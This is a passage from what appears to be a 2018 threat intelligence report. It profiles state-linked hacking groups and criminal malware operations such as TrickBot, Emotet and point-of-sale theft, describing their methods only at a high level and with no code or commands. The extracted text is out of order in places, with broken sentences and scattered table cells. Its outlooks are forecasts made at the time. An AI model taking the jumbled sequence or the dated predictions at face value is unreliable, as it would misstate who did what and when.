groups, incorporating commodity tools and better OPSEC techniques
into their TTPs. Additional attempts to reorganize the overall intelligence
community in China may result in a centralized body that can provide better
synthesis for cyber operations. Groups tied to well-resourced intelligence
agencies will almost certainly have access to the results of additional
upstream, supply chain compromises, a notable trend in 2017 that will likely
continue.
After the 2015 cyber agreement between the U.S. and China, there was
a shift to acquiring intellectual property through the buy-out of foreign
companies. Because of the large outflow of cash from China, this method
may be discouraged in the near term; therefore, cyber operations to acquire
intellectual property may rise again, affecting countries in Europe, Japan, the
United States, and possibly Russia.
There is some evidence that there has been a rise in U.S. targeting. The
Trump administration has at times released strong rhetoric on China-U.S.
relations, although in the latter half of 2017 this language shifted to one
of cooperation in dealing with the potential nuclear threat of North Korea.
In 2018, Falcon Intelligence assesses U.S. targeting will likely fall under
three categories — pure espionage, opportunistic compromises of soft
targets such as non-governmental organizations (NGOs) and think tanks, and
operations that are such a high-priority, it is worth the risk of violating the
2015 agreement with the previous administration.

Russia
Activity attributed to Russia-based adversaries
FANCY BEAR and BERSERK BEAR began
to increase in Spring 2017. Both adversaries
initiated and maintained extensive operations
throughout 2017, demonstrating the capacity
to target multiple sectors worldwide. Falcon
Intelligence also identified evidence of tool
updates from VENOMOUS BEAR, suggesting
this adversary has been ramping up its
development tempo.
FANCY BEAR continued to show interest in
Western targets in the government, defense
and military sectors. Many of these operations
use spear-phishing emails to deliver malware
payloads to targets of interest. Several
campaigns during 2017 made use of zero-day
exploits, underscoring the fact that FANCY
BEAR is a well-resourced adversary. (See Figure
6 for a timeline of some of the most notable
observations in 2017.)
Amid a wide range of reconnaissance
operations affecting numerous sectors,

including energy and transportation verticals,
BERSERK BEAR was involved in high-profile
activity targeting critical infrastructure
organizations in the United States and Europe,
as shown in Figure 7. The actor made use of
novel techniques aimed at compromising SMB
credentials at targeted organizations. Activity
during 2017, as well as historical BERSERK BEAR
operations against critical infrastructure entities,
indicate that this adversary could operate in
support of cyber operational preparation of
the environment, which is meant to facilitate
additional military actions.

COZY
BEAR

VOODOO
BEAR

The interconnectivity of hacktivist groups
with Russian adversaries became a subject of
discussion over the course of 2016, as evidence
has suggested that cyber operations are
coordinated with disinformation campaigns.
In 2017, the synchronization of these methods
appeared to continue, with added measures
by the Russian state to combat information it
deemed undesirable, and to control or monitor
media on various technology platforms.

been suspected of working in close coordination
with Russia state-sponsored adversaries.

In 2016, Falcon Intelligence predicted Russian
state-sponsored adversaries would continue to
use possible hacktivist fronts. This was observed
early in 2017, when CyberBerkut and Guccifer 2.0
reemerged in January after months of silence.
Both entities released statements refuting
allegations that Russia tampered with the U.S.
presidential election.

The self-styled hacktivist group “Fancy Bears’
international hack team” (FBIHT) released
documents and data, purportedly stolen
from sports regulation organizations. Falcon
Intelligence assesses that FBIHT plays an active
role in Russian information operations against
sports organizations with the goal of redeeming
the international perception of Russia as a
leading sports nation, through hacking-enabled
campaigns designed to discredit other athletes
and organizations. FBIHT is believed to operate
in conjunction with Russian targeted intrusion
operations, particularly those of FANCY BEAR.
FANCY BEAR began targeting World AntiDoping Agency (WADA) resources, as well as
the Court of Arbitration for Sport (CAS), in early
August 2016, then the International Olympic
Committee (IOC) in late 2016, and
the International Association of Athletics
Federations (IAAF) in early 2017.

CyberBerkut was also active in Summer
2017. In July, the group released messaging
aimed at discrediting the Clinton Foundation
and suggesting the Hillary Clinton campaign
received funds through money laundering
schemes with Ukrainian business entities. in
August, it accused the U.S. government of
using Ukraine for biological testing purposes.
At inception, CyberBerkut focused on targeting
Ukraine and NATO, but recently and as evident
in 2017, this group appeared to broaden its
scope, focusing on the U.S. and its possible
meddling in Ukraine. CyberBerkut has previously

Iran
Operations linked to Iran largely targeted
entities in the Middle East. Both named and
unnamed Iranian adversaries appear to have
a specific interest in Saudi Arabia, in line with
historic diplomatic disputes and cultural
differences between these countries.
The most significant activity to occur early
in 2017 was a wave of destructive attacks
in January against entities in Saudi Arabia
using the malware known as Shamoon. The
January wave was a continuation of similar
destructive attacks observed at the end of 2016.
CrowdStrike links the development of Shamoon
malware to an adversary known as VOLATILE
KITTEN; however, there are indications that
CHARMING KITTEN played a role in these
destructive attacks as an acquirer of access to

Table 6
Iranian
Adversary
Activity

Although FANCY BEAR appears to be one of the most active adversaries,
it is equally likely that it is simply the most visible. More sophisticated
adversaries, such as COZY BEAR and VENOMOUS BEAR, are very possibly
conducting operations using newly developed tools and network access
previously obtained by BERSERK BEAR’s extensive reconnaissance and
exploitation efforts. In keeping with what was observed in the NotPetya
and BadRabbit campaigns, Russia-based adversaries will continue to
disguise campaigns and tools as cybercrime.

Targeted intrusion activity linked to Iranian
actors continued throughout 2017, with the
CHARMING KITTEN and HELIX KITTEN actors
maintaining the highest operational tempo.
CHARMING KITTEN consistently conducted
credential-stealing operations against domestic
political dissidents and international antiregime targets, particularly in the run-up to the
May 2017 presidential election. HELIX KITTEN
consistently conducted targeted intrusion
operations throughout 2017, heavily targeting
entities in the Middle East, particularly Saudi
Arabia. Much of its activity leveraged its custom
malware implant known as Helminth, which the
actor continues to develop over time.

HELIX KITTEN made continuous updates to the Helminth
implant and demonstrated the capacity to repurpose exploits
by incorporating CVE-2017-0199 a little more than a week

appears to be Saudi Arabia.

CHARMING KITTEN

Iran’s Soft War Doctrine Applied
Throughout 2017, Falcon Intelligence observed
evidence that Iran has incorporated elements
of the “soft war” doctrine into cyber operations.
The soft war doctrine describes attempts to
inhibit certain political, cultural and societal
influences from entering Iranian society. This
concept arose following the 2009 presidential
election, and internally has featured the use of
disinformation to influence domestic audiences
and silence dissident voices. The soft war
doctrine has also been the impetus behind
cyber intrusion activity targeting activist groups.
In May 2017, Falcon Intelligence observed
CHARMING KITTEN targeting NGOs, political

The outward-facing component of the soft war
doctrine aims to promote pro-Iran rhetoric and
counter the spread of the West’s cultural power.
As listed in the table below, additional activity
from CHARMING KITTEN in Summer 2017
demonstrates an interest in compromising nondomestic targets that are perceived to operate
against Iran.

CHARMING KITTEN likely supported information
gathering on politically vocal entities ahead of the
Iranian presidential election.

Iraqi Kurds

Iran likely had an interest in the movement for an
independent Kurdish state. In September 2017,
Kurds voted in favor of independence from Iraq,
but this movement is possibly perceived as a threat
to the domestic security of Iran.

Western Think Tanks

Think tanks remain a strategically important target
for Iran’s counter-intelligence operations, as Iranian
officials have declared that some of these entities
operate against their interests.

July 2017

August 2017

In the pursuit of the soft war doctrine, Iran has
often leveraged pro-Iran hacking groups, thus
blurring the lines of state-sponsored cyber
activity. Activity from these cyber operatives
was observed in June 2017, when cyberattacks
occurred within 24 hours of an Islamic State
of Iraq and Syria (ISIS) bombing in Tehran. The
pro-Iran cyber response targeted Saudi Arabian
websites — some reportedly affiliated with the
Saudi government — with DDoS (distributed
denial of service) attacks and defacements.

2018
Outlook

dissidents and activist communities. The
extensive infrastructure behind this campaign
appeared to have been created between
mid-April and early May 2017. Considering the
targeting profile and the operational time frame,
this activity may have been designed to provide
situational awareness to Iran’s leadership prior
to the May 19, 2017, presidential election.

Concurrently, information operations designed
to tie Saudi Arabia to terrorist attacks appeared
to have increased across social media platforms.
Notably, Iranian leaders blamed Saudi Arabia
for the ISIS attack. The apparent timing of the
defacement efforts, information operations and
statements from Iranian government officials
increases the possibility that a coordinated
response from state organizations such as
the Islamic Revolutionary Guard Corps (IRGC)
occurred, although the exact degree of
involvement could not be determined.

Efforts

Iran

On May 19, 2017, President Hassan Rouhani won re-election. Although
often described as a moderate in the media, Rouhani has overseen
the use of Iran’s cyber capabilities to curtail dissent, disseminate
state-sponsored media content, and even launch destructive attacks.
Rouhani also spearheaded the approval of the 2015 nuclear deal
— the Joint Comprehensive Plan of Action (JCPOA) — which he
advertised as being good for the economy in Iran. An Iranian economic
boon has not materialized yet, and with the JCPOA failing to be recertified by the Trump administration in Washington, Rouhani may turn
to soft war doctrine — particularly disinformation operations — to
discredit opposition both domestically and internationally.
In October 2017, the U.S. government imposed a series of sanctions
against the IRGC. The sanctioning of the IRGC and Iran’s ballistic
missile program will likely lead to an increase in tensions between
Iran and the U.S., and possibly between Iran and other western
nations supporting U.S. policies. The Iranian government’s response
has often been laden with warnings that it may withdraw from
the JCPOA in retaliation, although this is unlikely given support
from European countries for the plan. Again, Iran may turn to its
information warfare apparatus to drive anti-U.S. sentiment.
Considering the protests in late December 2017, Iranian adversaries
will very likely continue to use cyber capabilities to stem unrest,
silence dissident voices and censor undesirable information from
Iranian networks. Iranian supreme leader Ayatollah Khamenei
has claimed these protests were instigated by Iran’s enemies,
and therefore additional targeting of entities outside of Iran —
particularly in Saudi Arabia and other Middle East countries —
may occur as a result. Regardless, the targeting of Saudi Arabian
networks is almost certain to continue in the new year.

North Korea
Falcon Intelligence observed DPRK-based
targeted intrusion activity throughout 2017,
with growing evidence that these adversaries
engage in operations on an international scale,
not only for the purposes of espionage but also
to raise revenue for the Kim Jong Un regime.
In the latter half of 2017, diplomatic tensions
and military threats between North Korea
and the international community escalated
significantly, driven by nuclear weapons testing
and additional missile launches. The rising
tensions have yet to lead to outright destructive
cyberattacks from these adversaries, although
wiper malware is a known component of the
toolkit available to DPRK adversaries.

Adversary

Ops Tempo

Description

LABYRINTH CHOLLIMA

High

This adversary continued to improve the Hawup
malware, introducing new encryption techniques
early in 2017 and an Android variant in November 2017.
Operations from this adversary continue to be timed
with missile launches, but increasingly, LABYRINTH
CHOLLIMA TTPs are being used to target the financial
and cryptocurrency sector.

STARDUST CHOLLIMA

Closely associated with targeting the financial industry,
(specifically the SWIFT compromises of 2016), this
adversary continued to use the TwoPence malware
Medium/High framework. In May 2017, Falcon OverWatch observed
TwoPence activity at an academic sector organization,
suggesting this adversary’s target scope is broader
than originally assessed.

SILENT CHOLLIMA

Low

Evidence of an Expanding
Target Scope

While tracking DPRK-based campaigns, Falcon
Intelligence has identified several code-level
similarities from malware families associated
with DPRK adversaries. In addition to what was
observed with WannaCry ransomware, new
Hawup variants associated with LABYRINTH
CHOLLIMA contain code overlaps with the
TwoPence framework attributed to STARDUST
CHOLLIMA. Technical analysis continues to
support the “code pool theory,” which suggests
the existence of a shared development
environment that is accessible to multiple
DPRK-based actors.

Most commonly associated with destructive activity,
SILENT CHOLLIMA appears to have become less
active, or has been supplanted by new actor groups. It
is also possible that this adversary is working in close
connection with the other DPRK groups in ways that
have not been directly observed.

In March 2017, Falcon Intelligence observed
a malicious Korean-language document that
delivered a Hawup payload. This incident,
which was identified days before a March 6
DPRK missile launch, is indicative of traditional
LABYRINTH CHOLLIMA campaigns in that it
appears to target South Korea and is timed
with missile testing. As the year progressed,
however, CrowdStrike noted a shift in the
targeting of Hawup malware.
As early as April 2017, LABYRINTH CHOLLIMA
began operations that used English job
description decoy documents to target
victims in the U.S. and Europe. In September,
sensitive source reporting indicated this
activity also impacted multiple U.S. electrical
utilities. Although it is unclear whether the U.S.
energy sector has been a consistent target for
LABYRINTH CHOLLIMA, this reported targeting
coincided with a sharp increase in rhetoric from
the U.S. and DPRK following President Trump’s
speech to the United Nations (UN) General
Assembly, which was critical of the DPRK and
its leader Kim Jong Un.

Table 8
DPRK Adversary
Activity

2018
Outlook

North Korea

LABYRINTH CHOLLIMA was also suspected of
contributing to a series of campaigns beginning
in July 2017 that used financial- or Bitcointhemed lures, a previously unreported malware
called HtDnLoader, and an EPS (encapsulated
PostScript file) exploit carried within malicious
HWP files. Although this operation was
suspected of targeting South Korea, part of
this adversary’s traditional target scope, the
use of cryptocurrency themes represents a
new interest for this actor. Additional targeting
of cryptocurrency exchanges and financial
sector targets may reflect the pursuit of
avenues to acquire foreign currency for
the Kim regime, much like the 2016 SWIFT
(Society For Worldwide Interbank Financial
Telecommunications) attacks attributed to
STARDUST CHOLLIMA.
While LABYRINTH CHOLLIMA has primarily
been associated with espionage operations,
continued code overlaps with other DPRK
adversaries such as STARDUST CHOLLIMA
present several possibilities, including:
• Joint operations conducted with the
support of multiple groups
• An operational hand-off among DPRK
adversaries
• A malware development organization
supplying technical support to
multiple groups

Given the geopolitical tension surrounding the North Korean nuclear program,
DPRK-based adversaries are likely to continue malicious cyber activity against
entities in South Korea, Japan and the U.S. Network access obtained via
remote access tools such as Hawup may be used to deploy wiper malware.

40

41

Given the gravity of a possible compromise to the U.S. energy sector, Falcon
Intelligence has assessed that this specific targeting may represent DPRK
posturing via cyber operations that could deliver destructive effects against the
U.S. critical infrastructure, should a military conflict occur.

2018
Outlook

The possibility of continuing financial or Bitcoin-associated activity cannot be
discounted, especially as economic sanctions reduce the number of foreign
currency options for the Kim regime.
HtDnLoader, a custom malware observed in this year’s BTC-themed campaigns,
appeared to be created specifically for that operation, suggesting that DPRK
adversaries can create single-use tools, expanding their TTPs as needed.
Additionally, the new internet connection that the DPRK acquired via Russia in
October 2017 may provide their cyber actors with more capacity for building
infrastructure to support their offensive campaigns.

Details

PoSeidon

Although no extensive activity was observed from this activity, an incident
leveraging CVE-2017-0199 and possibly targeting entities in Brazil was identified
in April 2017, shortly after the zero-day of this vulnerability.

OceanLotus
(aka APT32)

Falcon Intelligence observed intermittent activity linked to this Southeast Asiabased adversary. Identified incidents used CVE-2017-0199 exploit documents to
target the Philippines, with additional activity focused on the hospitality sector.
Public reporting also ascribed a months-long strategic web compromise (SWC)
campaign to OceanLotus. This campaign leveraged compromised websites for
organizations in sectors such as government, military, human rights, oil and gas,
and media located in Southeast Asia. Targeting is consistent with the economic
interests of Vietnam.

Babylon

This East Asia-based adversary uses macro-enabled documents to deliver
a malware dubbed KONNI. Observed themes for 2017 decoy documents
suggest this actor targets entities with an interest in Korean issues. Several of
these samples were identified in August at a time of rising tension between
the U.S. and North Korea.

MYTHIC LEOPARD

MYTHIC LEOPARD is a Pakistan-based adversary with operations likely
located in Karachi. This adversary continued to use spear phishing to target
Indian military and defense entities. Falcon Intelligence identified additional
tooling for this adversary, including .NET-based binder tools used to disguise
malware as legitimate files, and a custom RAT called Waizsar, which is likely
used as a first-stage downloader.

VICEROY TIGER

India-based operations increased in late summer when a ChineseIndian border dispute sparked both military and cyber activity. At that
time, malicious documents dropped malware samples, which shared
infrastructure previously associated with VICEROY TIGER.

QUILTED TIGER

Falcon Intelligence observed extensive activity from this adversary,
suggesting this group has taken on some of the operational tasks originally
given to VICEROY TIGER. India-based targeted intrusion historically focused
on Pakistan military targets, but QUILTED TIGER has expanded this target
scope to include China, Mongolia, Bangladesh and in December 2017, Japan.
This adversary uses commodity tools and exploits (such as CVE-2017-8759
and CVE-2017-11882) after zero-day.

EXTREME JACKAL
(and other
Palestine-based
groups)

In the latter half of 2017, Falcon Intelligence tracked a targeted intrusion
campaign leveraging H-Worm and likely targeting victims with an interest
in or involvement with Palestinian political affairs. Observed activity spoofed
Palestinian news websites and was present before and after the FatahHamas reconciliation agreement announced in early October 2017. Falcon
Intelligence attributes this campaign to EXTREME JACKAL with medium
confidence, based on C2 infrastructure overlaps, third-party reporting
and overall consistency in TTPs. Victims in this campaign were likely
concentrated in the Palestinian Territories, the United Arab Emirates (UAE)
and Egypt. Falcon Intelligence maintains an assessment that EXTREME
JACKAL is likely an Arabic-speaking, non-state actor operating — at least
in part — from Gaza, and likely has aligned interests with Hamas. Additional
activity leveraging malware known as KASPERAGENT was also observed,
following the announced Fatah-Hamas reconciliation.

EVOLVING

ECRIME

ECOSYSTEM

Introduction

In 2016, Falcon Intelligence introduced an overview of the eCrime ecosystem, which features
an end-to-end look at the various parts of a successful criminal enterprise and how these
pieces may manifest online. This ecosystem will continue to evolve over time, responding
to current events that affect it such as the law enforcement actions mentioned above and
competition within individual marketplaces.
CrowdStrike has observed some eCrime operators develop new capabilities based on publicized
vulnerabilities or the TTPs used in high-profile campaigns (e.g., NotPetya). The rising value
of some cryptocurrencies has led adversaries to change their operations to take advantage
of a potential investment, and the ever-increasing numbers of mobile banking applications
users has led to innovations in mobile malware.

Mineware and the Rising Value
of Cryptocurrencies
Falcon Intelligence continues to monitor
cryptocurrency trends and their effects on
the eCrime ecosystem. The value of Bitcoin
has continued to rise over the course of 2017,
with exponential growth during November
and December. The rising value has also led
to higher transaction costs, which could affect
criminal operations in several ways. Data
extortionists and ransomware operators could
include transaction costs in the price of the
ransom or switch to a different cryptocurrency
altogether. Alternatively, money launderers
could see a decrease in payouts as eCrime
actors seek to maximize their own profits.

mineware on customer networks.
WIZARD SPIDER was not the only adversary
to target cryptocurrencies in this dramatically
bullish cryptocurrency marketplace.
Ransomware operators have been observed
adjusting their pricing models based on
fluctuating values. One possible example of
this was observed with Samas ransom price
variations (described later in this report).

Overlapping Operations —
Cybercrime Delivery Market

Over the course of 2017, CrowdStrike has also
tracked the market share of Monero, which was
introduced in 2014 but that experienced rapid
growth in 2016 and throughout 2017 due to
design improvements. Monero has consistently
been among the top ten cryptocurrencies
based on the volume of transactions. With an
increase in the popularity of this cryptocurrency
has come a new threat vector — mineware, also
known as cryptojacking, which uses a victim
machine’s resources to mine Monero.

Within the eCrime ecosystem there are
a number of areas in which an adversary
can specialize, and developers of delivery
mechanisms — e.g., spambots, exploit kits and
malware loaders — can often support numerous
other criminal enterprises. As such, Falcon
Intelligence has observed several overlapping
operations, suggesting some named adversaries
are associated through a customer-provider
relationship. In the case of some banking Trojan
operations, a single affiliate is responsible for
providing its own delivery mechanisms. Thus,
cybercriminals can be customers of multiple
services in order to optimize the delivery of the
intended payload to the target victim set.

In August 2017, established banking Trojan
threat actor WIZARD SPIDER released an
update to TrickBot that included a Monero
mining module. In the last two months of 2017,
mineware as a technique expanded to include
drive-by mineware such as CoinHive, which
runs entirely in victims’ browsers when they
visit websites that have included the mineware
code. In November 2017, Falcon telemetry data
showed an increased exposure to drive-by

Malware Loaders: A Competitive Market
Motivates Customers to Shop Around
Falcon Intelligence continues to track updates
and new releases in the crimeware loader
market. The developers of these tools are
running malware-as-a-service enterprises,
offering their product for sale on underground
forums at varying rates, depending on whether
the customer purchases a limited or lifetime
license.

Malware Loaders

Malware

Description

Hancitor

On the market since 2013, this loader has seen a resurgence of activity
since late 2016. In 2017, it supported Zloader and Panda Zeus (BAMBOO
SPIDER) banking Trojan operations.

Quant Loader

Developed by malware-as-a-service group GURU SPIDER, this malware
has seen regular updates throughout the year, up to v.1.54+ on December
11, 2017. During a testing period in April 2017, INDRIK SPIDER used Quant
Loader as well as Godzilla.

Smoke Loader

This modular crimeware, which is often used as a loader, has received
regular updates throughout 2017. Recent improvements include an Email
Grabber module, additional support to the Form Grabber module, and
an update for the Hidden TV module. This loader has been observed
delivering TrickBot, suggesting at least some portion of WIZARD SPIDER
affiliates are customers.

Godzilla Loader

Shortly after promising the release of version 1.7 in March 2017, the
developer and this loader disappeared from underground forums. As
of early December, the malware has reappeared, with the developer
promising version 1.7 in early 2018.

ARS VBS

In mid-December 2017, a Russian eCrime threat actor introduced
ARS VBS. According to Falcon Intelligence sensitive sources, it sold
numerous copies in just over five days, and has received numerous
positive reviews from satisfied customers. This newcomer has yet to
acquire significant market share, but early success suggests it is a
product of at least moderate quality.

MUMMY SPIDER:
From Banking Trojan
to Pay-Per-Install Service
In July 2017, Falcon Intelligence identified a
new trend in Emotet malware, developed
by MUMMY SPIDER. Emotet (aka Geodo)
downloads four plugins, one of which is a
spam plugin, presumably used in conjunction
with the collection of victim email credentials
and Microsoft Outlook address books. Unlike
previous campaigns, in mid-2017 MUMMY
SPIDER did not always push their own banking
Trojan module through this spam capability.
Instead, CrowdStrike observed Emotet

downloading other Trojans, including QakBot
and Dridex, suggesting MUMMY SPIDER
was starting a pay-per-install loader service
available to other criminal groups.
In the following months, CrowdStrike tracked
this adversary’s continued efforts to evade
detection, including changing the RSA key
during regular C2 updates. MUMMY SPIDER
launched regular mass spam distribution
campaigns to increase the rate of infection for
Emotet, thus raising the number of potential
victims for other crimeware.

MONTY SPIDER:
Simultaneously Supporting Multiple Threats
MONTY SPIDER, the operator of the CraP2P
spam botnet, has regularly supported
ransomware campaigns, particularly Locky
(developed by DUNGEON SPIDER). However,
in July 2017, CrowdStrike began to observe
both a rise in the distribution of the TrickBot
banking Trojan (operated by WIZARD SPIDER),
and more notably, simultaneous support to
WIZARD SPIDER and DUNGEON SPIDER. In
these campaigns, MONTY SPIDER tested a
new method of geolocation-based distribution.
Victims received a 7-Zip attachment containing
a VBS script that when opened, issued a
command to one of three URLs to obtain
the victim’s geolocation. The country code

was then used by the VBS to determine the
set of URLs to use to download the payload,
either TrickBot or Locky. This combined spam
campaign suggests one of the following:
• There may be a level of cooperation
between DUNGEON SPIDER, WIZARD
SPIDER, and MONTY SPIDER. It is likely
that MONTY SPIDER already has distinct
existing relationships with WIZARD SPIDER
and DUNGEON SPIDER, but a liaison would
have been required to pull off this level of
spamming efficiency.
• MONTY SPIDER may be infecting by
geolocation to maximize their payouts. It
is likely WIZARD SPIDER and DUNGEON
SPIDER pay different amounts based on IP
geolocation.

Banking Trojans
Banking Trojans remain one of the main
tools used by criminal operators to obtain
revenue, with many large banks and some
web-based retail companies directly named in
the webinject configurations of the malware.
The design of these operations targets both
large financial institutions and their individual
customers. One of the most active banking
Trojan threats in 2017 was WIZARD SPIDER,
discussed below. The continuous updates
made by this adversary appeared to drive a
higher operational tempo to BAMBOO SPIDER,
developers of Panda Zeus, beginning in
September 2017.
Early in 2017, INDRIK SPIDER, the adversary
behind Dridex, appeared to be the most
active eCrime adversary in the banking Trojan
landscape. In the first few months of the year,
this adversary released several new subbotnets designed to focus on specific victim
regions (e.g., sub-botnet 7200 primarily targets
financial institutions in the United Kingdom), and

appeared to be experimenting and perfecting
delivery mechanisms. However, in the latter
half of 2017, Dridex spamming appeared to
decrease, suggesting this adversary has shifted
to a more targeted approach. The malware
has the capability to use keyword searching
on victim machines to assist the adversary in
identifying financial software, a tactic that may
help pinpoint opportunities to transact highvalue fraud.
Throughout 2017, Falcon Intelligence also
tracked the spread of Android banking Trojans,
as well as the evolution of this threat in terms of
sophistication. Many Android banking Trojans
use screen overlay web injection and SMS
interception to compromise online mobile
banking. Some other Trojans feature webinjects
for other applications, such as Uber, and social
media sites. Increases in the global smartphone
user base, and in the subset of those users who
employ the devices to access sensitive data
(such as bank accounts or payment services),

developed, relying on webinject functionality.
Outside of this core banking Trojan capability,
WIZARD SPIDER developed modules for Virtual
Network Computing (VNC), collection of victim
machine information, and a mail searcher
module. From late July through September,
WIZARD SPIDER significantly increased the
botnet capability of TrickBot by adding these
new modules:
• wormDll — SMB spreader
• outlookDll — Harvests victim data from MS
Outlook
• importDll — Information stealer targeting
browsers
• testWormDLL — Monero cryptocurrency
miner
• shareDLL — Lateral movement around victim
network, via shares victim has access to
TrickBot has code similarities with the nowdefunct Dyre operation. Dyre infections
dropped in late 2015, and the sudden decrease

has largely been attributed to Russian law
enforcement action in November of that year.
Some of the initial URL patterns included in
TrickBot configuration files were previously
observed in Dyre, and technical analysis has
further shown that TrickBot code design and
communication protocols are remarkably similar
to those of Dyre. However, it appears the code
was written from scratch. WIZARD SPIDER may
have employed a developer who worked for the
Dyre group, or the code for Dyre malware was
sold to another criminal group and used as a
foundation to build a new, successful banking
Trojan.
Analysis of TrickBot development and campaign
data demonstrates that WIZARD SPIDER is
run in a businesslike manner, operating within
standard business hours and potentially
assigning individuals to specific tasks, such as
development and infrastructure management.
Additionally, it is suspected that WIZARD
SPIDER has been able to increase the skill set
of the TrickBot development team by either
bringing in new developers or using periods of
inactivity to concentrate on development of new
capabilities.
WIZARD SPIDER is the core development and
operating group behind the TrickBot malware,
but there are affiliates of this group that operate
distinct variants designated by identifiers called
“group tags” (gtags). It is not yet known how each
affiliate is operated, but it is highly likely that they
are run either by operators within the WIZARD
SPIDER group, or by criminal individuals with
close ties to WIZARD SPIDER.

Banking Trojans

2017 was a period of increasing tempo and well-calculated decisionmaking from WIZARD SPIDER. This pace has most recently been matched
by BAMBOO SPIDER in the latter part of 2017, possibly in an attempt to
contend in a competitive marketplace dominated by more sophisticated
operations. Falcon Intelligence continues to investigate the extent of
recent INDRIK SPIDER operations to determine whether this adversary
is significantly changing TTPs.
Many banking Trojans, such as Gozi ISFB and GootKit, are operated by
affiliates who have acquired a variant of the malware. Groups behind these
campaigns are likely small, not highly sophisticated, and not necessarily
well resourced. Some individual actors may be focused regionally, as was
observed in the Polish-language Nymaim campaigns.

CARBON SPIDER: Pattern of Testing
Exploit Documents

Targeted eCrime
Targeted eCrime groups use TTPs more
commonly associated with targeted intrusion
espionage campaigns. Such techniques include
spear phishing, extensive reconnaissance and
lateral movement within a victim network.
Instead of state secrets, these adversaries are
frequently looking for data to monetize — often
credit card numbers or access to financial
accounts. In 2017, the most active targeted
eCrime adversary observed by CrowdStrike was
CARBON SPIDER, although this assessment of
the actor’s operational tempo may be partially
due to the method by which this adversary
tested its tools and exploit documents
throughout most of the year (as noted in the
following).
COBALT SPIDER, an actor group that has

in malware samples, and the use of Russian
domain registrars, it is suspected with medium
confidence that this actor is based in Russia.

primarily focused on financial sector targets
in Russia and Eastern Europe, also launched
spear-phishing campaigns in 2017, making quick
use of available vulnerabilities, native Windows
OS capabilities and publicly available tools such
as Cobalt Strike. This adversary has monetized
attacks by targeting ATMs and issuing
commands to dispense cash (a technique
termed “Jackpotting”), which is collected by a
network of mule operatives who work as part of
the campaign team.

CARBON SPIDER’s toolkit includes both opensource and custom malware. Open-source
tools include the Metasploit framework for
operations against machines within the target
network, customized variants of TinyMet (a tiny
meterpreter stager) for deploying payloads
during lateral movement, and variants of
MimiKatz for dumping user credentials.
Custom-built malware families that are uniquely
associated with CARBON SPIDER are the firststage implant Agent ORM (aka Toshliph), a fullfledged backdoor tool for long-term persistence
called Agent Sekur (aka Anunak), and first-stage
tools VB Flash and JS Flash RATs.

In December 2017, Falcon Intelligence provided
support for an active incident response
engagement involving malware known as
FrameworkPoS, used for stealing credit card
track data from PoS devices. FrameworkPoS
is probably exclusively used by an actor

Since at least May 2017, CARBON SPIDER has
maintained a relatively consistent development
cycle of introducing a significant evolution to
the delivery document, followed by a period
of testing and refinement. Malicious RTF
and DOC files now leverage embedded OLE

objects (.lnk and .cmd) to launch processes that
extract and deploy their payloads. CARBON
SPIDER’s first-stage tool VB Flash, which was
developed entirely in Visual Basic Script and
used throughout 2016, has been re-developed
into a version that runs using JavaScript, dubbed
JS Flash. This version not only contains the
previous VB Flash capabilities, but also includes
new methods of obfuscation, a new C2 protocol
and some additional capabilities.
CARBON SPIDER continues to leverage these
tools to target the U.S. hospitality sector,
with a shifting focus from hotel chains to
restaurants. CARBON SPIDER spear-phishing
emails typically use subject lines that reference
customer details, invoices or payment
information for a booking. The body of the email
then explains that this information is contained
within a document attached to the email, with
instructions on how to unlock the protected
document. The emails are usually directed to
customer-facing personnel within the victim
organization, and open-source reporting has

50

51

documented that quite often these emails will
be followed by telephone conversations to
enable successful exploitation.
The primary objective of these operations is to
capture large dumps of PoS credit card data.
CARBON SPIDER is thought to be responsible
for the 2016 hack against the Oracle MICROS
PoS system, widely used by retail and
hospitality companies. There is growing
evidence to suggest the actor has used the
information gleaned from this attack to target
specific businesses that operate these systems,
which would support the choice of targets
observed in recent months.

From June through October 2017, CARBON
SPIDER testing of new exploit delivery
documents was observed almost daily for
minor configuration edits, with new code
developments released monthly. In November
2017, however, the length of time between
observed testing activity began to increase,
suggesting the adversary may have taken this
testing in-house — most likely in an attempt
to reduce exposure of its TTPs to security
researchers. Regardless, new samples of
Agent Sekur were identified in December 2017,
evidence that this adversary remains active.
Falcon Intelligence expects CARBON SPIDER to
continue to target U.S.-based businesses in 2018.

Some of the targeting profile and TTPs of COBALT SPIDER are similar to those of
CARBON SPIDER. Both groups make use of open-source and penetration testing tools,
with spear phishing being a primary mode of delivery. Although both adversaries have
targeted banks in Eastern Europe and Central Asia, these entities remain the primary
targeting profile for COBALT SPIDER, a stark distinction from CARBON SPIDER, which
has broadened its scope over the last two years. Despite these similarities, Falcon
Intelligence has observed no infrastructure overlap between these groups, and they
have each incorporated exploits into their operations at different times. CARBON SPIDER
is more closely associated with custom toolkits, whereas COBALT SPIDER is also
known as “Cobalt Gang” because of its use of the Cobalt Strike tool in its operations.

Samas Ransomware
Samas operators usually compromise internetfacing services such as vulnerable JBoss
installations in targeted organizations, and
use lateral movement tools to install their
ransomware on multiple machines; thus, this
actor group is considered to be a targeted
eCrime adversary. The operators of Samas
ransomware stayed out of the headlines in 2017,
and Falcon Intelligence has only identified two

possibly successful campaigns — one in April
2017 and another in October 2017.
The ransom demands from Samas infections
are generally some of the highest among active
ransomware families, and a decline in observed
activity may be attributed to the rising value of
Bitcoin. Samples recovered in October featured
a lower ransom demand. The previous ransom
demand was 1.7 BTC for a single machine, 6 BTC

for half the infected machines, and 12 BTC for all
infected machines in the victim’s network. The
new demand is 1.5 BTC for a single machine,
4.5 BTC for half the infected machines, and 9
BTC for all infected machines. The reduced BTC

Outlook

Comparison:
CARBON
SPIDER vs.
COBALT
SPIDER

demand is likely due to the recent USD value
increase of BTC and means that these payments
are now significantly higher in value, although
the lower BTC amounts likely appear more
appealing to victims.

CARBON SPIDER

CARBON SPIDER’s phased development and deployment cycle has proven
very profitable, and it is expected that it will continue to target U.S.-based
businesses in the fast-food and hospitality sectors. The group remains
focused on exploiting PoS terminals, and both sectors (as well as retail) have
very high volumes of PoS usage. There is no expectation that this adversary
will target banks or the financial sector at this time, although this was
previously in their target scope (ca. 2016).
Overall, credit card data will continue to be profitable. SKELETON SPIDER, as
well as other similarly styled operations, will monetize this data by selling
it on a per-card basis in darknet carding shops. U.S.-based businesses that
have not adopted the latest chip-and-PIN technology will continue to be the
most heavily targeted victims of this kind of operation. Likewise, a wider
adoption of chip-and-PIN technology could change the operational TTPs or
geographic targeting of these groups.
COBALT SPIDER appears to have the resources for acquiring and developing
software or exploits, possibly relying on builders obtained from other
developers and sold on underground forums. They will almost certainly
continue to evolve in the new year and further broaden their target scope.
